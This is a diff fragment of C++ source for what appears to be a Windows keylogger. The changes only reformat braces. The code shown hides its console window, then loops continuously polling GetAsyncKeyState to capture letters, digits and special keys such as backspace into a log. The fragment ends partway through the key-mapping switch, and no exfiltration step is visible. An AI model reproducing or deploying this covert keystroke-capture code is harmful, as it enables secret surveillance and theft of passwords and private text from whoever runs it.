@@ -2,26 +2,18 @@
 #include <fstream>
 #include <string>
 
-int main()
-{
+int main() {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	std::ofstream log;
 	std::string tmp;
-	while (true)
-	{
+	while (true) 	{
 		Sleep(15);
-		for (int i = 8; i <= 190; i++)
-		{
-			if (GetAsyncKeyState(i) == -32767)
-			{
-				if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57))
-				{
+		for (int i = 8; i <= 190; i++) {
+			if (GetAsyncKeyState(i) == -32767) {
+				if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57)) {
 					tmp = char(i);
-				}
-				else
-				{
-					switch (i)
-					{
+				} else {
+					switch (i) {
 					case VK_BACK:
 						tmp = "#BACK";
 						break;
